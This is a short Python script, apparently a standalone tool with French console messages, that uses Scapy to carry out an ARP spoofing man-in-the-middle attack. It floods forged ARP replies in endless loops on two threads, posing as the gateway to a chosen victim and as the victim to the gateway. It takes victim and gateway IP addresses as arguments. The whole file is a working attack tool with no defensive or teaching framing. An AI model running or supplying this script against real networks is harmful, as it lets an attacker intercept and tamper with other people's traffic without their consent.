from scapy.all import ARP, send
import sys
import threading

def spoof(target_ip, spoof_ip):

    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=spoof_ip
    )
    print(f"[*] Usurpation : {spoof_ip} -> {target_ip}")
    while True:
        send(packet, verbose=False)

def arp_mitm(victim_ip, gateway_ip):

    print("[*] Lancement de l'attaque Man-in-the-Middle")
    print(f"[*] Se faire passer pour la passerelle ({gateway_ip}) auprès de la victime ({victim_ip})")
    print(f"[*] Se faire passer pour la victime ({victim_ip}) auprès de la passerelle ({gateway_ip})")

    threading.Thread(target=spoof, args=(victim_ip, gateway_ip)).start()

    threading.Thread(target=spoof, args=(gateway_ip, victim_ip)).start()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python arp_mitm.py <victim_ip> <gateway_ip>")
        print("Exemple: python arp_mitm.py 192.168.1.100 192.168.1.1")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    arp_mitm(victim_ip, gateway_ip)
